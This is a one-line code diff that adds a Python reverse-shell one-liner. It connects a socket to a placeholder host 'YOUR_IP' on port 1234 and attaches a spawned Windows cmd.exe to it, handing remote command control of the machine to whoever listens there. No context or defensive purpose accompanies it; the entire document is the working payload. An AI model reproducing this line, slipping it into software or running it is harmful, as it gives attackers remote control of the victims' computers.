@@ -1,0 +1,1 @@
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('YOUR_IP',1234));p=subprocess.Popen(['cmd.exe'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno(),shell=True)
